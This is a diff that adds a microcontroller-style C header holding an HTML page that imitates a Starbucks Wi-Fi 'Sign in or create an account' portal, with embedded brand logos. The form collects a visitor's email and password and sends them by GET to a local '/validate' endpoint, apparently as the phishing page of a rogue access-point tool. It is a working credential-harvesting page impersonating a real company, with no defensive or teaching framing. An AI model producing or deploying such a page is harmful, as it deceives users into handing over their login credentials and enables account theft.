@@ -1,0 +1,128 @@
+//Starbucks
+const char STARBUCKS_HTML[] PROGMEM = R"=====(
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Starbucks login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+</head>
+
+<style>
+div {
+  width: 95%;
+  padding: 10px 10px 20px 10px;
+  border: 2px solid #BFBFBF;
+  background-color: white;
+  box-shadow: 10px 10px 5px #aaaaaa;
+}
+body {
+  position:absolute;
+  margin: 10px;
+  background-color: #E9E9E9;
+  height:100%;
+  width:90%;
+}  
+
+<!--Bordered form-->
+form {
+  border: 3px solid #f1f1f1;
+}
+
+<!--Full-width inputs-->
+input[type=text], input[type=password]
+{
+  width: 80%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+input[type=text], input[type=email]
+{
+  width: 80%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+
+
+<!--Set a style for all buttons-->
+button{}
+
+.button {
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 6px 4px;
+  cursor: pointer;
+  background-color: #2e8b57; /* SeaGreen */
+  border-radius: 40px;
+  hover {opacity: 0.8;}
+}
+
+<!--Recolour hyperlink to green-->
+
+a:link {
+  color: green;
+  background-color: transparent;
+  text-decoration: none;
+}
+
+a:visited {
+  color: darkgreen;
+  background-color: transparent;
+  text-decoration: none;
+}
+
+a:hover {
+  color: red;
+  background-color: transparent;
+  text-decoration: underline;
+}
+</style>
+</head>
+<body>
+
+<div>
+
+<img src="data:image/png;base64,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" alt="Starbucks_logo" width="20%"/>
+
+<h1> <strong>Sign in or create an account</strong>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFsAAABbCAMAAAAr6AmrAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAByUExURQAAAPb29i4pAN/HAAC88unp6ZGCAP////zhAA0OCDw8PMbGxgAmMXFxcYGBgUdAABscHSwsLEZGRqyaALi4uHZqANzc3JKSklxcXMKtAKenpwCaxl5UAABFWdLS0jo3HvHXAABbdgCm1gCw4wB2mACGrGnV7qYAAATQSURBVGjezZnrdqowEEYnUpRwEUTqharLW9//FY8kJJncSGiPazU/u3AXN8PMlwir9y34I+x03dB1+hY2WVMAuibvYF8O8FqHyzvY/WZgb7o3sMka2IqXAjOVzJESz+42nB0vBeYqmSEF5ip5Sdn9b7ZQMkMKzFYSL8Vmk65q26ojPiW2FPcnbDYpcg5oLw4lp9ohpWjHTxQBttKaF5YSulxSS0qhHkQxyb606qtj+I4pqY/H2pQivie7890Em/QATvioJElOhhSMBtgTP5vfHtDSgAslWWZIEeiSOp6yzr6wS8v7/abDhZIs06UI9Pl+Z7eTh9j09vHx0OFCSZZpUhT64+NGA+wde5Tlt4KzwlJKhBQmFqO/SvthgjERwQVXSrAUGw1VOlGDHXXBlRIhJe9caNpN1fd44wYcKZFSHGgwQgCs/HBRLRt22/WWs48L9rcmiLZ7lQsOSomQMq7zlx/t6INp5YaPSoSUMNrVv93wxVawuZQw2jkbnHChBEkJoN1zR4OfeXl9ZpkhBaOrNHqmIfhYiUqJlHJ7TKN981LBv86GEinl/PU9iWbsi9aDnQsr0SrFt4auNbDDaE1Jlm0X4U/knB2+EOoEs7XXx7c4u5mpJEoK5ex9+LaPGvqa1MGP7DmbdPLOT0vX2l4zYyVb54XSFe2JqEEZHejSwsSvq1SVX1B9i+4H9JT8FJ2cqB4YQWa6xu02eh3FM2hEMpTvJfmdF+VDBUmw3/NXxSW/8JE6+wnpf+pF+eiJr1cVP/JyXS7AFazNOV/R2fWSfAof1fScJ72I04vjb3w4+zeRXhYxXpSPvIiZxet4L14fvrmzO0BkvUgfzk0nuE5g0EyY8nLFM6IJ5xONbA0cfRnjp5nObCZ56Lp+tjV9mr03I6f7Jjhx8Pq0p49GBzf5/LzRaCe35xnTickmiEyHxDTmqXqiDMfJxmLymdp0MLrUSB6uDikRUsrxekTnbyhjp+oggN7YlY9nGVQipZTPB6PfFP2QjmzZuF/kOyZPK5FSJP2u6AN8YPe6jYeIeSEluFIses/ZB42MH/q0Ev3tEWbGj7coVzXfuo0IJUgKpn9TlKt4kdpkU8l1ezoZMch4fTj9ifIgr9LH3SCbSlg/Nea0lWjL5/1xRmw+aUpU4u0+t5SIfqr1XS4l37eouPkdbjh7bbSQtuBnNFgJ6qda3+VSetK1RnOpxn1Do5E7UfFISYLFYi/8Xw5DR6c3F5FjqUYWuxSl5Fj7MvMohWWHLlecTuRY0vFtCc07dGwllSgfuQwBsl6ElBWmb1gkBBEdDm1bFVp6E0qkD1rtZH4B4UVJ4empattDT/x7QE2Jyh9D7yR7ceunI5KyKSL3l1gJ8lEYuW70okmJ3M8zJcqHCgkq1zEvhpQAm5+CDkqkjw0+VcRerhNSYEKJ8mEe48rTzMGLVwr4laD6SO1rlBevFPAq2Z5cPlbW7K452yEFPEpg4c+nphf+FXqyij6v8vqQFx609lRFnFeps3I9ybi84Es3lyBbOwLPAz+JFOgo3pYCE0po+JecXUX9UsDdS4I+7HqxpVh7qQ4874vXi7yZLpjtZT+N/cVqJ+oldB476o7yYXqpAmxeJnmxmrW4l+D+8hXxZ/hA9WJsSP7Q7/Nz1z+zBNhVwJOJVAAAAABJRU5ErkJggg==" alt="starbucks_star" width="5%"/>
+</h1>
+
+<class="login-page">
+<class="form"><form class="login-form" action="/validate" method="GET">
+
+<input name="user" required="" type="email" placeholder="Username or email" /> 
+  <br />
+<input name="pass" required="" type="password" placeholder="Password" /> <input name="url" type="hidden" value="service.thecloud.net" />
+<!--img src="data:image/png;base64,/-->
+<img  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD8AAAAmCAMAAABEWLO+AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAABFUExURf///6qqqjk5OS4uLhoaGvHx8fr6+gsLCxERESMjI2xsbOLi4urq6oWFhZ6enlNTU76+vnp6es7OzmFhYY6OjkhISNvb20hgi+oAAAHtSURBVEjHtVbZkoQgDJQzARTE6/8/dYMzs+VgZNyp2jwp0p2DNqHr/tFMT2a+gtpJzEnvJudl+iPJ5KUGAFesPKBchb3tOhIY9RpFsGRBiNkhoBvCLfggEdwstuNaP2ZJ4Qz9R7Qo+3JgoyoM7Sw2T75zf5kXgpwa8KhB+0aWdqEN+SoEMwPIsZ3eVvbwIUwKMX8+Z+EAI7+uIifAmnJaAZfzqSGorVrrh11AdUVsAvRVETJiqgsXHWiCI+g6roywmsq7Px0GRTQaY4RCyOdvq23Dg8b5scVI1LUkxJFgYeBdBvlbRQVDd00wUDlO8N6hOISrLEMw7w8j4MwIRStzeMGJEevjGBNDXiDyrRaMLj2iefj3DP7IyvoX+lm15ZXJm0gkxEP+kskf028B2/Xvufrrg4QGJoJev/iDBMecfzookIsgAqrYF/2BG1veryIg/eOu/xM8vnvfiwhw+oFCVoSXdd+1g4Z0qie1ppOfztL/U+8M9PvOjGImCnfo7vQfHdkvhXjd2ujgodGCc+m/rQ5PZ4G+MUS2lejj5VRM1FLEh/RUYWDasB0J7ZaPDdpkR3PKVzlukbrYnflXGJa1TOwUYzDFRExlIKvlFvrRUzyl8Zz/JEAAtY635//z/uHpDrGb8l58ef/Zren4B19JFW4e7QP2AAAAAElFTkSuQmCC" alt="starbucks_eye" width="5%" />
+
+
+<p><input disabled="disabled" type="checkbox" />Keep me signed in.<br>
+<a href="/">Details</a><br>
+<a href="/">Forgot your username?</a><br>
+<a href="/">Forgot your password?</a></p>
+
+
+
+<button class="button" type="Submit"><strong>Sign In</strong></button>
+
+
+</div>
+
+</body>
+</html>
+)=====";
